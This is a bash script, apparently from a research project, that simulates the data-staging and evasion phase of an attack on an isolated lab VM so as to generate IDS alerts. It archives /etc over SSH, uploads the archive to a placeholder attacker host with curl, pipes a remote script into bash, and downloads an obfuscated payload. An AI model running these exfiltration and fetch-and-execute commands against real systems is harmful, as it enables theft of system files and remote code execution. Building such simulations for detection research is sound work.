#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# === SETTINGS ===
TARGET_IP="<TARGET_IP>"
TARGET_USER="user"
TARGET_PASSWORD="<TARGET_PASSWORD>"   # <-- set your lab sudo password
ATTACKER_IP="<ATTACKER_IP>"

echo "[+] Starting Level 3 - Phase 2: Data Staging & Evasion Simulation"

# 1. SSH in and create data archive
echo "[+] Creating sensitive archive..."
ssh ${TARGET_USER}@${TARGET_IP} 'echo "$TARGET_PASSWORD" | sudo -S tar -czf /tmp/etc_hidden_backup.tar.gz /etc'

# 2. Simulate exfiltration of archive to attacker's server via curl
echo "[+] Transferring archive to attacker via HTTP..."
ssh ${TARGET_USER}@${TARGET_IP} "curl -T /tmp/etc_hidden_backup.tar.gz http://${ATTACKER_IP}/upload"

# 3. Simulate command execution via curl | bash (stealthy behavior)
echo "[+] Simulating stealthy command execution using curl | bash..."
ssh ${TARGET_USER}@${TARGET_IP} "curl http://${ATTACKER_IP}/stealth.sh | bash"

# 4. Simulate downloading obfuscated filename
echo "[+] Downloading file with obfuscated extension..."
ssh ${TARGET_USER}@${TARGET_IP} "curl http://${ATTACKER_IP}/payload.enc -o /tmp/payload.enc"

echo "[+] L3 Phase 2 simulation complete. Review Suricata alerts on Ubuntu."

